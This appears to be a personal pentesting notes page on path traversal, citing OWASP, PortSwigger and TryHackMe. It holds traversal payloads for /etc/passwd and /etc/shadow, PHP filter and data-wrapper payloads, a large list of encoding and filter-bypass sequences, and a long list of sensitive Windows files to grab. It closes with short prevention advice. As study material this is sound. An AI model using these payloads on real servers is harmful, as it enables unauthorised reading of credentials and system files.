# Path Traversal

Path Traversal *also known as Directory Traversal ([Portswigger](https://portswigger.net/web-security/file-path-traversal) and [OWASP](https://owasp.org/www-community/attacks/Path_Traversal))* is a direct read (and or execute) of file on the server via abusing relative path traversal of the file system from some web endpoint to then read a file from a directory not intended to be accessible. It is commonly confused with [[File-Inclusion]], which relies on the `include()` function to include file.  [OWASP](https://owasp.org/www-community/attacks/Path_Traversal): *This attack is also known as "dot-dot-slash", "directory traversal", "directory climbing" and "backtracking".* It is also a misnomer as it is dichotomy:

Path Traversal:
- Absolute Path Traversal: `vulnerable?parameter=/var/www/html/secrets.txt`
- Relative Path Traversal: `vulnerable?parameter=/var/www/html/../../etc/passwd`

- Difference between Absolute and Relative Paths:
	- Absolute Paths - `/etc/passwd` or `C:\Windows\System32\drivers\etc\hosts`
	- Relative Paths - `../etc/passwd`; relative to the position in a file system from a source position in the file system 

For a Relative Path Traversal Provide a path that is exactly as is in the URL
```bash
curl http://badwebsite/load?file=../../../../../dt/vuln --path-as-is
```

It is worth noting that while the Relative Path Traversal is more prevalent in literature Absolute Path Traversal to just a file in the same directory exists. [OWASP](https://owasp.org/www-community/attacks/Path_Traversal) example included:
```bash
# The For sites:
http://testsite.com/get.php?f=list
http://testsite.com/get.cgi?f=2
http://testsite.com/get.asp?f=test
# An attacker can execute this attack like this:
http://testsite.com/get.php?f=/var/www/html/get.php
http://testsite.com/get.cgi?f=/var/www/html/admin/get.inc
http://testsite.com/get.asp?f=/etc/passwd
```

- Application code and data.
- Credentials for back-end systems.
	- SSH, VPN keys
	- User files containing passwords
- Sensitive operating system files.
	- Configuration files containing passwords


PHP-Wrappers including mostly commonly used [[PHP-Wrappers]] or Data Wrappers can be utilised like:
```php
// PHP filter
pathtraversal.com/find?file=php://filter/convert.base64-encode/resource=../../../../../etc/shadow
// Data Wrapper: `data` as URL, `text/plain` as mime-type and php code
data:text/plain,<?php%20phpinfo();%20?>
```

#### Traversal encoding:

Remember this is a guide to ideas of how to encode Directory Traversal, encoding payloads on the fly not from here.
```bash
../
..\
..\/
../etc/passwd\.\	# Path and dot truncation
../etc/passwd/./

# To bypass (recursive) stripping of `.` `/` encoding
# Singular (partial) encoding 
%2e%2e/ # ../
%2e%2e%2f # ../
..%2f # ../
%2e%2e%5c # ..\
%2e%2e\ # ..\ 
..%5c #  ..\ 
%252e%252e%255c # ..\ 
..%255c # ..\
# Double encoding 
%252e%252e%252f
# UTF-8 encoding
%c0%ae%c0%ae%c0%af	
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
# Percent Encoding
# OWASP: Note that web containers perform one level of decoding on percent encoded values from forms and URLs
..%c0%af # ../
..%c0%9c # ..\
# Nested traversal sequences
..././
....//
....\/
....\
%00					# null byte
....////			# filter bypass
/%5C../%5C..

# Non Standard encodins - Portswigger
..%c0%af
..%ef%bc%8f

# Required directory
/var/www/images/../../../etc/passwd

# Application expecting a file extension
# Use a null byte to effectively terminate the file path, before the required extension
../../../etc/passwd%00.png
```

A modified list of sensitive files on Windows from [hakluke's medium article](https://hakluke.medium.com/sensitive-files-to-grab-in-windows-4b8f0a655f40) and [ SleepyLctl gist](https://gist.github.com/SleepyLctl/823c4d29f834a71ba995238e80eb15f9)
```powershell
# %windir% or C:\

%windir%\repair\sam  
%windir%\System32\config\RegBack\SAM  
%windir%\repair\system  
%windir%\repair\software  
%windir%\repair\security  
%windir%\debug\NetSetup.log # AD domain name, DC name, internal IP, DA account  
%windir%\iis5.log
%windir%\iis6.log
%windir%\iis7.log
%windir%\system32\logfiles\httperr\httperr1.log  
C:\sysprep.inf  
C:\sysprep\sysprep.inf  
C:\sysprep\sysprep.xml  
%windir%\Panther\Unattended.xml  
C:\inetpub\wwwroot\Web.config  
%windir%\system32\config\AppEvent.Evt # Application log   
%windir%\system32\config\SecEvent.Evt # Security log  
%windir%\system32\config\default.sav  
%windir%\system32\config\security.sav  
%windir%\system32\config\software.sav  
%windir%\system32\config\system.sav  
%windir%\system32\inetsrv\config\applicationHost.config  
%windir%\system32\inetsrv\config\schema\ASPNET_schema.xml  
%windir%\System32\drivers\etc\hosts # dns entries  
%windir%\System32\drivers\etc\networks # network settings  
%windir%\system32\config\SAM  # only really useful if you have access to the files while the machine is off
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

## Prevention

- Validate the user input before processing it - ideally compare to a whitelist and or permit alphanumeric characters only
- After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.
## References

[Portswigger](https://portswigger.net/web-security/file-path-traversal)
[OWASP](https://owasp.org/www-community/attacks/Path_Traversal)
[THM Room File Inclusion, Path Traversal](https://tryhackme.com/room/filepathtraversal)